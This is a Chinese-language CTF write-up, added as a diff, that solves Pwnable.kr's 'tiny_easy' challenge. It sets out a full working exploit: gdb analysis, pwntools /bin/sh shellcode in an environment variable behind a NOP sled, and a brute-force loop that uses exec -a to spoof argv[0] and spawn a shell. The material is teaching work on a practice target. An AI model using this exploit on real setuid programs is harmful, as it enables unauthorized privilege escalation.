@@ -13708,3 +13708,202 @@ log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip
 
 ------
 
+### tiny_easy
+
+这是**Pwnable.kr**的第二十七个挑战`tiny_easy`，来自**[Rookiss]**部分。
+
+```bash
+I made a pretty difficult pwn task.
+However I also made a dumb rookie mistake and made it too easy :(
+This is based on real event :) enjoy.
+
+ssh tiny_easy@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh tiny_easy@pwnable.kr -p2222                
+tiny_easy@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jun 23 11:14:20 2023 from 121.173.24.133
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+tiny_easy@pwnable:~$ ls -la
+total 28
+drwxr-x---   5 root tiny_easy     4096 Oct 23  2016 .
+drwxr-xr-x 117 root root          4096 Nov 10  2022 ..
+d---------   2 root root          4096 Jun 24  2014 .bash_history
+-r--r-----   1 root tiny_easy_pwn   30 Jun 24  2014 flag
+dr-xr-xr-x   2 root root          4096 Aug 20  2014 .irssi
+drwxr-xr-x   2 root root          4096 Oct 23  2016 .pwntools-cache
+-r-xr-sr-x   1 root tiny_easy_pwn   90 Jun 24  2014 tiny_easy
+```
+
+用户`tiny_easy`有权限访问的只有俩个文件：`flag`和`tiny_easy`。查看二进制文件`tiny_easy`信息。
+
+```bash
+tiny_easy@pwnable:~$ file ./tiny_easy
+./tiny_easy: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, corrupted section header size
+tiny_easy@pwnable:~$ checksec ./tiny_easy
+[*] '/home/tiny_easy/tiny_easy'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+```
+
+下载二进制文件`tiny_easy`并用`IDA Pro 32bit`打开，可以看到以下内容：
+
+```assembly
+LOAD:08048054                 public start
+LOAD:08048054 start           proc near               ; DATA XREF: LOAD:08048018↑o
+LOAD:08048054                 pop     eax
+LOAD:08048055                 pop     edx
+LOAD:08048056                 mov     edx, [edx]
+LOAD:08048058                 call    edx
+LOAD:08048058 start           endp ; sp-analysis failed
+LOAD:08048058
+LOAD:08048058 LOAD            ends
+LOAD:08048058
+LOAD:08048058
+LOAD:08048058                 end start
+```
+
+用`gdb`对程序进一步分析。
+
+```bash
+tiny_easy@pwnable:~$ gdb ./tiny_easy
+(gdb) b *0x8048056
+Breakpoint 1 at 0x8048056
+(gdb) r
+Starting program: /home/tiny_easy/tiny_easy 
+
+Breakpoint 1, 0x08048056 in ?? ()
+(gdb) info r
+eax            0x1      1
+ecx            0x0      0
+edx            0xfff6adb4       -610892
+ebx            0x0      0
+esp            0xfff6a408       0xfff6a408
+ebp            0x0      0x0
+esi            0x0      0
+edi            0x0      0
+eip            0x8048056        0x8048056
+eflags         0x202    [ IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb) x/7s $edx
+0xfff6adb4:     "/home/tiny_easy/tiny_easy"
+0xfff6adce:     "XDG_SESSION_ID=68337"
+0xfff6ade3:     "SHELL=/bin/bash"
+0xfff6adf3:     "TERM=xterm-256color"
+0xfff6ae07:     "SSH_CLIENT=121.18.90.141 54541 2222"
+0xfff6ae2b:     "SSH_TTY=/dev/pts/39"
+0xfff6ae3f:     "USER=tiny_easy"
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6d6f682f in ?? ()
+```
+
+程序将`/hom`移动到`$edx`，然后`call edx`让程序跳转到地址`0x6d6f682f`(/hom)，结果触发了段错误。先制造一个`shellcode`。
+
+```bash
+from pwn import *
+
+shell = ssh(user='tiny_easy', host='pwnable.kr', port=2222, password='guest')
+# shell.download('./tiny_easy')
+shellcode = asm(shellcraft.i386.linux.sh())
+# b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
+```
+
+继续用`gdb`分析程序
+
+```bash
+tiny_easy@pwnable:~$ export A=$(python -c 'print("jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80")')
+tiny_easy@pwnable:~$ gdb ./tiny_easy
+(gdb) b *0x8048058
+Breakpoint 1 at 0x8048058
+(gdb) r
+Starting program: /home/tiny_easy/tiny_easy 
+
+Breakpoint 1, 0x08048058 in ?? ()
+(gdb) info r
+eax            0x1      1
+ecx            0x0      0
+edx            0x6d6f682f       1836017711
+ebx            0x0      0
+esp            0xffb36d08       0xffb36d08
+ebp            0x0      0x0
+esi            0x0      0
+edi            0x0      0
+eip            0x8048058        0x8048058
+eflags         0x202    [ IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb) x/8xw 0xffb36d08
+0xffb36d08:     0x00000000      0xffb37da0      0xffb37dcf      0xffb37de4
+0xffb36d18:     0xffb37df4      0xffb37e08      0xffb37e2c      0xffb37e3f
+(gdb) x/16s 0xffb37da0
+0xffb37da0:     "A=jhh///sh/bin\211\343h\001\001\001\001\201\064$ri\001\001\061\311Qj\004Y\001\341Q\211\341\061\322j\vX"
+0xffb37dcf:     "XDG_SESSION_ID=68460"
+0xffb37de4:     "SHELL=/bin/bash"
+0xffb37df4:     "TERM=xterm-256color"
+0xffb37e08:     "SSH_CLIENT=121.18.90.141 55582 2222"
+0xffb37e2c:     "SSH_TTY=/dev/pts/3"
+0xffb37e3f:     "USER=tiny_easy"
+0xffb37e4e:     "COLUMNS=102"
+0xffb37e5a:     "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
+0xffb37ec2:     "MAIL=/var/mail/tiny_easy"
+0xffb37edb:     "_=/usr/bin/gdb"
+0xffb37eea:     "PWD=/home/tiny_easy"
+0xffb37efe:     "LANG=en_US.UTF-8"
+0xffb37f0f:     "LINES=29"
+0xffb37f18:     "HOME=/home/tiny_easy"
+0xffb37f2d:     "SHLVL=1"
+```
+
+猜想一个`argv[0]`的地址，比如`0xffb37da0`。在进行暴力破解之前，我们应该先用nop(`\x90`)填充shellcode，以提高暴力破解的成功率`call edx`。爆破成功后会出现`$`，在`shell`输入`cat flag`得到`What a tiny task :) good job!`
+
+```bash
+tiny_easy@pwnable:~$ export A=$(python -c 'print("\x90" * 30000 + "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80")'); for i in {1..1000}; do bash -c "exec -a $(python -c 'print("\xa0\x7d\xb3\xff")') ./tiny_easy"; done
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+... ...
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+$ cat flag
+What a tiny task :) good job!
+```
+
+------
+
